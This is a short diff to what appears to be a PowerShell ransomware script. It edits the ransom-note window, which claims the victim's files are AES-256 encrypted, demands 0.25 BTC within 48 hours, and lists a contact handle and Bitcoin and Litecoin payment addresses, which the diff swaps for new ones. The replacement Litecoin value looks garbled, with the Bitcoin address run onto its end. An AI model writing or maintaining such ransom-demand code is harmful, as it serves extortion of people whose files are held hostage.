@@ -97,7 +97,7 @@ $form.Controls.Add($label3)
 
 $textbox = New-Object Windows.Forms.TextBox
 $textbox.Multiline = $true
-$textbox.Text = "All your documents, images, videos, and archives have been encrypted with AES-256.`n`nTo recover your files, you must pay 0.25 BTC within 48 hours.`n`nContact: kodaxd1`nPayment address: bc1qmyrx6uf6hxcc0fns4gc8l3gjygm0l6kvw4n2au or ltc: ltc1qq92x9wr62t03zx5xljx6dmemqlswwgv83sve5q`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
+$textbox.Text = "All your documents, images, videos, and archives have been encrypted with AES-256.`n`nTo recover your files, you must pay 0.25 BTC within 48 hours.`n`nContact: kodaxd1`nPayment address: bc1qwjgqnucwvtsmqs8gxdd28jmyvu7nyztrxqadsx or ltc: LXoSTzJuA5UymfRWgmAWvpNT96KFfTwGxvbc1qwjgqnucwvtsmqs8gxdd28jmyvu7nyztrxqadsx`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
 $textbox.Size = New-Object Drawing.Size(650, 180)
 $textbox.Location = New-Object Drawing.Size(20, 120)
 $textbox.ReadOnly = $true
